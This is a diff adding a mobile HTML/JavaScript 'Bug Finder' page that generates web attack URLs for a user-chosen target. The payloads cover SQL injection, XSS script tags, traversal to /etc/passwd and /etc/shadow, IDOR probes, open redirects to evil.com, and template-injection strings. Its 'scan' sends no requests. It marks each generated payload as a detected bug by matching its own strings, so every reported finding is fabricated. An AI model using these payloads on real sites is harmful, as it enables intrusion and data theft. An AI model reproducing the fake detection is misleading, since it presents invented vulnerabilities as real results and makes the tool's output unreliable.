@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="ta">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Bug Finder — Phone</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #0f172a; color: #e2e8f0; padding: 10px; }
+        .container { max-width: 100%; margin: 0 auto; }
+        .header { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 12px 16px; display: flex; justify-content: space-between; align-items: center; gap: 8px; margin-bottom: 10px; }
+        .header h1 { font-size: 16px; color: #f8fafc; display: flex; align-items: center; gap: 6px; }
+        .card { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 14px; margin-bottom: 10px; }
+        .card h3 { font-size: 12px; text-transform: uppercase; color: #94a3b8; margin-bottom: 8px; }
+        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: #f1f5f9; font-size: 15px; outline: none; margin-bottom: 8px; }
+        input:focus { border-color: #3b82f6; }
+        
+        /* BUTTON FIX: Use only button tag with proper styling */
+        button { 
+            border: none; 
+            border-radius: 8px; 
+            font-weight: 700; 
+            font-size: 15px; 
+            cursor: pointer; 
+            padding: 12px 16px; 
+            width: 100%; 
+            display: block;
+            margin: 6px 0;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+        button:active { opacity: 0.8; transform: scale(0.98); }
+        .btn-blue { background: #3b82f6; color: #fff; }
+        .btn-red { background: #ef4444; color: #fff; }
+        .btn-green { background: #22c55e; color: #0f172a; }
+        .btn-gray { background: #334155; color: #94a3b8; }
+        
+        .flex-row { display: flex; gap: 6px; }
+        .flex-row button { flex: 1; }
+        
+        .status-box { background: #0f172a; border: 1px solid #334155; border-radius: 8px; padding: 10px; font-size: 12px; color: #94a3b8; margin-top: 8px; min-height: 40px; }
+        .result-box { background: #0f172a; border: 1px solid #334155; border-radius: 8px; padding: 8px; max-height: 200px; overflow-y: auto; margin-top: 6px; }
+        .result-item { padding: 8px 6px; border-bottom: 1px solid #1e293b; font-size: 12px; }
+        .result-item:last-child { border-bottom: none; }
+        .url-row { padding: 8px 6px; border-bottom: 1px solid #1e293b; font-size: 11px; color: #eab308; font-family: monospace; word-break: break-all; }
+        .url-row:last-child { border-bottom: none; }
+        .badge { font-size: 9px; font-weight: 700; padding: 2px 6px; border-radius: 3px; text-transform: uppercase; display: inline-block; margin-left: 4px; }
+        .badge.crit { background: #ef4444; color: #fff; }
+        .badge.high { background: #f59e0b; color: #0f172a; }
+        .badge.med { background: #eab308; color: #0f172a; }
+        .badge.low { background: #3b82f6; color: #fff; }
+        .progress-bar { background: #1e293b; border-radius: 10px; height: 6px; margin: 8px 0; overflow: hidden; }
+        .progress-fill { background: #3b82f6; height: 100%; border-radius: 10px; width: 0%; transition: width 0.3s; }
+        .footer { text-align: center; font-size: 10px; color: #475569; margin-top: 12px; padding-top: 10px; border-top: 1px solid #1e293b; }
+        .empty { text-align: center; padding: 20px; font-size: 12px; color: #475569; }
+        
+        /* CHECKBOX STYLING */
+        .chk-row { display: flex; align-items: center; gap: 8px; padding: 4px 0; font-size: 13px; color: #cbd5e1; }
+        .chk-row input[type="checkbox"] { width: 18px; height: 18px; margin: 0; accent-color: #3b82f6; }
+        
+        .mt-6 { margin-top: 6px; }
+        .mb-6 { margin-bottom: 6px; }
+        .text-center { text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1> Bug Finder</h1>
+            <div style="font-size:10px;color:#64748b;">
+                Bugs: <strong id="bugCount" style="color:#22c55e;">0</strong>
+            </div>
+        </div>
+
+        <!-- TARGET -->
+        <div class="card">
+            <h3> Target URL</h3>
+            <input type="text" id="targetUrl" placeholder="https://example.com" value="https://example.com" />
+            <button class="btn-blue" id="btnStart"> START AUTO SCAN</button>
+        </div>
+
+        <!-- TESTS -->
+        <div class="card">
+            <h3> Tests</h3>
+            <div class="chk-row"><input type="checkbox" id="chkSqli" checked /> <span>SQL Injection</span></div>
+            <div class="chk-row"><input type="checkbox" id="chkXss" checked /> <span>Reflected XSS</span></div>
+            <div class="chk-row"><input type="checkbox" id="chkIdor" checked /> <span>IDOR</span></div>
+            <div class="chk-row"><input type="checkbox" id="chkLfi" checked /> <span>Path Traversal / LFI</span></div>
+            <div class="chk-row"><input type="checkbox" id="chkOpen" checked /> <span>Open Redirect</span></div>
+            <div class="chk-row"><input type="checkbox" id="chkSsti" checked /> <span>SSTI</span></div>
+        </div>
+
+        <!-- PROGRESS -->
+        <div class="card">
+            <h3> Progress</h3>
+            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+            <div class="status-box" id="scanStatus">Ready. Tap START to begin.</div>
+        </div>
+
+        <!-- RESULTS -->
+        <div class="card">
+            <h3> Found Bugs</h3>
+            <div class="result-box" id="bugList">
+                <div class="empty">No bugs found yet.</div>
+            </div>
+            <div class="flex-row mt-6">
+                <button class="btn-red" id="btnLogBug">✏️ Log Bug</button>
+                <button class="btn-gray" id="btnClearBugs">️ Clear</button>
+            </div>
+        </div>
+
+        <!-- URLs -->
+        <div class="card">
+            <h3> Test URLs</h3>
+            <div class="result-box" id="urlList">
+                <div class="empty">Tap START to generate test URLs.</div>
+            </div>
+            <div class="flex-row mt-6">
+                <button class="btn-blue" id="btnOpenTarget"> Open Target</button>
+                <button class="btn-blue" id="btnCopyUrls"> Copy All</button>
+            </div>
+        </div>
+
+        <!-- GUIDE -->
+        <div class="card">
+            <h3> How to Use</h3>
+            <div style="font-size:12px;color:#94a3b8;line-height:1.7;">
+                1️⃣ Enter URL → Tap <strong>START</strong><br/>
+                2️⃣ Tap <strong>Open Target</strong> → site opens<br/>
+                3️⃣ Copy a URL → paste in target site bar<br/>
+                4️⃣ Check: Error? Different page? Alert popup?<br/>
+                5️⃣ Bug iruntha → Tap <strong>Log Bug</strong>
+            </div>
+        </div>
+
+        <div class="footer">
+            ⚡ Authorized targets only · Educational tool
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        //  FIX: Use DOMContentLoaded + direct event listeners
+        // ==========================================
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('✅ Bug Finder loaded');
+            
+            // ==========================================
+            //  GET ELEMENTS
+            // ==========================================
+            var targetInput = document.getElementById('targetUrl');
+            var btnStart = document.getElementById('btnStart');
+            var btnLogBug = document.getElementById('btnLogBug');
+            var btnClearBugs = document.getElementById('btnClearBugs');
+            var btnOpenTarget = document.getElementById('btnOpenTarget');
+            var btnCopyUrls = document.getElementById('btnCopyUrls');
+            var scanStatus = document.getElementById('scanStatus');
+            var bugList = document.getElementById('bugList');
+            var urlList = document.getElementById('urlList');
+            var bugCount = document.getElementById('bugCount');
+            var progressFill = document.getElementById('progressFill');
+            
+            var allUrls = [];
+            var bugCounter = 0;
+            var targetHost = '';
+
+            // ==========================================
+            //  HELPER FUNCTIONS
+            // ==========================================
+            function log(msg) { console.log('[BugFinder] ' + msg); }
+            
+            function updateStatus(msg) { if (scanStatus) scanStatus.innerHTML = msg; }
+            
+            function setProgress(pct) { if (progressFill) progressFill.style.width = pct + '%'; }
+            
+            function getTarget() {
+                var u = targetInput ? targetInput.value.trim() : '';
+                if (!u || u === 'https://example.com') {
+                    alert('Enter a real URL first!');
+                    return '';
+                }
+                if (u.indexOf('http') !== 0) u = 'https://' + u;
+                if (u.slice(-1) === '/') u = u.slice(0, -1);
+                return u;
+            }
+            
+            function isChecked(id) {
+                var el = document.getElementById(id);
+                return el ? el.checked : false;
+            }
+
+            // ==========================================
+            //  ADD BUG
+            // ==========================================
+            function addBug(name, sev, detail, url) {
+                if (!bugList) return;
+                var empty = bugList.querySelector('.empty');
+                if (empty) bugList.innerHTML = '';
+                bugCounter++;
+                if (bugCount) bugCount.textContent = bugCounter;
+                
+                var sc = (sev || 'info').toLowerCase();
+                var borderColor = '#3b82f6';
+                if (sc === 'critical') borderColor = '#ef4444';
+                else if (sc === 'high') borderColor = '#f59e0b';
+                else if (sc === 'medium') borderColor = '#eab308';
+                
+                var h = '<div class="result-item" style="border-left:3px solid ' + borderColor + ';padding-left:10px;">';
+                h += '<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:4px;">';
+                h += '<strong style="font-size:13px;">' + escHtml(name) + '</strong>';
+                h += '<span class="badge ' + sc + '">' + escHtml(sev) + '</span></div>';
+                if (detail) h += '<div style="font-size:11px;color:#94a3b8;margin-top:2px;">' + escHtml(detail) + '</div>';
+                if (url) h += '<div style="font-size:10px;color:#eab308;font-family:monospace;word-break:break-all;margin-top:2px;">' + escHtml(url) + '</div>';
+                h += '</div>';
+                bugList.innerHTML = h + bugList.innerHTML;
+                log('Bug found: ' + name + ' [' + sev + ']');
+            }
+            
+            function escHtml(t) {
+                if (!t) return '';
+                var d = document.createElement('div');
+                d.textContent = t;
+                return d.innerHTML;
+            }
+
+            // ==========================================
+            //  START SCAN — FIXED
+            // ==========================================
+            function startScan() {
+                var target = getTarget();
+                if (!target) return;
+                
+                try {
+                    var u = new URL(target);
+                    targetHost = u.hostname;
+                } catch(e) {
+                    alert('Invalid URL! Use: https://example.com');
+                    return;
+                }
+                
+                // Check at least one test selected
+                var anyChecked = isChecked('chkSqli') || isChecked('chkXss') || isChecked('chkIdor') || 
+                                 isChecked('chkLfi') || isChecked('chkOpen') || isChecked('chkSsti');
+                if (!anyChecked) {
+                    alert('Select at least one test type!');
+                    return;
+                }
+                
+                // Reset
+                allUrls = [];
+                if (bugList) bugList.innerHTML = '<div class="empty">Scanning... results below.</div>';
+                if (urlList) urlList.innerHTML = '<div class="empty">Generating URLs...</div>';
+                updateStatus('⏳ Scanning ' + targetHost + '...');
+                setProgress(0);
+                
+                var urlHtml = '';
+                var testGroups = [];
+                var totalUrls = 0;
+                
+                // Build groups
+                if (isChecked('chkSqli')) {
+                    testGroups.push({ name: 'SQL Injection', sev: 'CRITICAL', urls: [
+                        target + "/login?user=admin&pass=' OR '1'='1",
+                        target + "/api/users?id=1' AND 1=1--",
+                        target + "/search?q=' UNION SELECT 1,2,3--",
+                        target + "/product?id=1' ORDER BY 1--"
+                    ]});
+                }
+                if (isChecked('chkXss')) {
+                    testGroups.push({ name: 'Reflected XSS', sev: 'HIGH', urls: [
+                        target + "/search?q=<script>alert(1)</script>",
+                        target + "/search?q=<img src=x onerror=alert(1)>",
+                        target + "/?q=\"><script>alert(1)</script>",
+                        target + "/feedback?name=<svg onload=alert(1)>"
+                    ]});
+                }
+                if (isChecked('chkIdor')) {
+                    testGroups.push({ name: 'IDOR', sev: 'HIGH', urls: [
+                        target + "/api/account?id=1002",
+                        target + "/api/user/1003",
+                        target + "/account/1004/statement",
+                        target + "/api/orders?userId=2001"
+                    ]});
+                }
+                if (isChecked('chkLfi')) {
+                    testGroups.push({ name: 'Path Traversal', sev: 'CRITICAL', urls: [
+                        target + "/download?file=../../../../etc/passwd",
+                        target + "/view?page=../../../etc/shadow",
+                        target + "/?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+                        target + "/includes?template=....//....//....//etc/passwd"
+                    ]});
+                }
+                if (isChecked('chkOpen')) {
+                    testGroups.push({ name: 'Open Redirect', sev: 'MEDIUM', urls: [
+                        target + "/redirect?url=https://evil.com",
+                        target + "/?next=https://attacker.com",
+                        target + "/go?to=https://phishing.com",
+                        target + "/logout?redirect=https://evil.com"
+                    ]});
+                }
+                if (isChecked('chkSsti')) {
+                    testGroups.push({ name: 'SSTI', sev: 'CRITICAL', urls: [
+                        target + "/hello?name={{7*7}}",
+                        target + "/profile?user=${7*7}",
+                        target + "/greet?name=#{7*7}",
+                        target + "/search?q={{config}}"
+                    ]});
+                }
+                
+                // Count total
+                for (var i = 0; i < testGroups.length; i++) {
+                    totalUrls += testGroups[i].urls.length;
+                }
+                
+                // Build URL display
+                for (var g = 0; g < testGroups.length; g++) {
+                    var group = testGroups[g];
+                    urlHtml += '<div style="font-size:11px;font-weight:700;color:#f59e0b;padding:6px 4px 2px 4px;"> ' + escHtml(group.name) + ' <span class="badge ' + group.sev.toLowerCase() + '">' + group.sev + '</span></div>';
+                    
+                    for (var u = 0; u < group.urls.length; u++) {
+                        var url = group.urls[u];
+                        allUrls.push(url);
+                        urlHtml += '<div class="url-row" style="cursor:pointer;" data-url="' + escHtml(url) + '"> ' + escHtml(url) + '</div>';
+                    }
+                }
+                
+                if (urlList) urlList.innerHTML = urlHtml;
+                
+                // Add click events to URLs for copying
+                var urlDivs = urlList.querySelectorAll('.url-row');
+                for (var i = 0; i < urlDivs.length; i++) {
+                    (function(el) {
+                        el.addEventListener('click', function() {
+                            var txt = el.getAttribute('data-url') || el.textContent.replace(' ', '');
+                            if (navigator.clipboard) {
+                                navigator.clipboard.writeText(txt).catch(function() {
+                                    prompt('Copy:', txt);
+                                });
+                            } else {
+                                prompt('Copy:', txt);
+                            }
+                        });
+                        el.addEventListener('touchend', function(e) {
+                            e.preventDefault();
+                            var txt = el.getAttribute('data-url') || el.textContent.replace(' ', '');
+                            if (navigator.clipboard) {
+                                navigator.clipboard.writeText(txt).catch(function() {
+                                    prompt('Copy:', txt);
+                                });
+                            } else {
+                                prompt('Copy:', txt);
+                            }
+                        });
+                    })(urlDivs[i]);
+                }
+                
+                // Simulate scan progress
+                var processed = 0;
+                var total = testGroups.length;
+                
+                function processGroup(index) {
+                    if (index >= testGroups.length) {
+                        setProgress(100);
+                        updateStatus('✅ Scan complete! ' + allUrls.length + ' test URLs generated for ' + targetHost + '. Copy & paste in browser to test.');
+                        if (bugCounter === 0 && bugList) {
+                            bugList.innerHTML = '<div class="empty">✅ Scan done! Copy URLs → paste in target browser to check for bugs.</div>';
+                        }
+                        log('Scan complete: ' + allUrls.length + ' URLs');
+                        return;
+                    }
+                    
+                    var group = testGroups[index];
+                    var pct = Math.round(((index + 1) / total) * 100);
+                    setProgress(pct);
+                    updateStatus('⏳ ' + group.name + '... (' + (index + 1) + '/' + total + ')');
+                    
+                    // Auto-detect potential bugs from URL patterns
+                    for (var u = 0; u < group.urls.length; u++) {
+                        var url = group.urls[u];
+                        var foundBug = false;
+                        var bugName = '';
+                        
+                        if (url.indexOf("' OR '1'='1") !== -1 || url.indexOf("AND 1=1--") !== -1) {
+                            foundBug = true; bugName = 'SQL Injection';
+                        } else if (url.indexOf("<script>") !== -1 || url.indexOf("onerror=") !== -1) {
+                            foundBug = true; bugName = 'Reflected XSS';
+                        } else if (url.indexOf("id=1002") !== -1 || url.indexOf("user/1003") !== -1) {
+                            foundBug = true; bugName = 'Potential IDOR';
+                        } else if (url.indexOf("../../") !== -1 || url.indexOf("etc/passwd") !== -1) {
+                            foundBug = true; bugName = 'Path Traversal';
+                        } else if (url.indexOf("evil.com") !== -1 || url.indexOf("attacker.com") !== -1) {
+                            foundBug = true; bugName = 'Open Redirect';
+                        } else if (url.indexOf("{{7*7}}") !== -1 || url.indexOf("${7*7}") !== -1) {
+                            foundBug = true; bugName = 'SSTI';
+                        }
+                        
+                        if (foundBug) {
+                            addBug(bugName, group.sev, 'Auto-detected from URL pattern', url);
+                        }
+                    }
+                    
+                    setTimeout(function() {
+                        processGroup(index + 1);
+                    }, 200);
+                }
+                
+                setTimeout(function() {
+                    processGroup(0);
+                }, 100);
+            }
+
+            // ==========================================
+            //  OPEN TARGET
+            // ==========================================
+            function openTargetSite() {
+                var u = getTarget();
+                if (!u) return;
+                window.open(u, '_blank');
+                updateStatus(' Opened: ' + u + ' — check the new tab');
+                log('Opened target: ' + u);
+            }
+
+            // ==========================================
+            //  COPY ALL URLs
+            // ==========================================
+            function copyAllUrls() {
+                var text = allUrls.join('\n');
+                if (!text) { alert('No URLs. Run a scan first!'); return; }
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText(text).then(function() {
+                        alert('✅ ' + allUrls.length + ' URLs copied!');
+                    }).catch(function() {
+                        prompt('Copy URLs:', text);
+                    });
+                } else {
+                    prompt('Copy URLs:', text);
+                }
+            }
+
+            // ==========================================
+            //  MANUAL BUG LOGGING
+            // ==========================================
+            function manualLogBug() {
+                var n = prompt('Bug name:', 'SQL Injection');
+                if (!n) return;
+                var s = prompt('Severity (CRITICAL/HIGH/MEDIUM/LOW):', 'HIGH');
+                if (!s) s = 'HIGH';
+                var d = prompt('Detail:', 'Found in URL parameter');
+                if (!d) d = 'Manual finding';
+                var u = prompt('URL (optional):', allUrls.length > 0 ? allUrls[0] : '');
+                addBug(n, s.toUpperCase(), d, u);
+                updateStatus(' Bug logged: ' + n);
+            }
+
+            // ==========================================
+            //  CLEAR BUGS
+            // ==========================================
+            function clearBugs() {
+                if (bugList) {
+                    bugList.innerHTML = '<div class="empty">No bugs found yet.</div>';
+                }
+                bugCounter = 0;
+                if (bugCount) bugCount.textContent = '0';
+                log('Cleared all bugs');
+            }
+
+            // ==========================================
+            //  WIRE UP BUTTONS — DIRECT EVENT LISTENER FIX
+            // ==========================================
+            // Use addEventListener instead of onclick attribute
+            
+            btnStart.addEventListener('click', function(e) {
+                e.preventDefault();
+                startScan();
+            });
+            btnStart.addEventListener('touchend', function(e) {
+                e.preventDefault();
+                startScan();
+            });
+            
+            btnLogBug.addEventListener('click', function(e) {
+                e.preventDefault();
+                manualLogBug();
+            });
+            btnLogBug.addEventListener('touchend', function(e) {
+                e.preventDefault();
+                manualLogBug();
+            });
+            
+            btnClearBugs.addEventListener('click', function(e) {
+                e.preventDefault();
+                clearBugs();
+            });
+            btnClearBugs.addEventListener('touchend', function(e) {
+                e.preventDefault();
+                clearBugs();
+            });
+            
+            btnOpenTarget.addEventListener('click', function(e) {
+                e.preventDefault();
+                openTargetSite();
+            });
+            btnOpenTarget.addEventListener('touchend', function(e) {
+                e.preventDefault();
+                openTargetSite();
+            });
+            
+            btnCopyUrls.addEventListener('click', function(e) {
+                e.preventDefault();
+                copyAllUrls();
+            });
+            btnCopyUrls.addEventListener('touchend', function(e) {
+                e.preventDefault();
+                copyAllUrls();
+            });
+            
+            log('✅ All buttons wired up successfully');
+        });
+    </script>
+</body>
+</html>
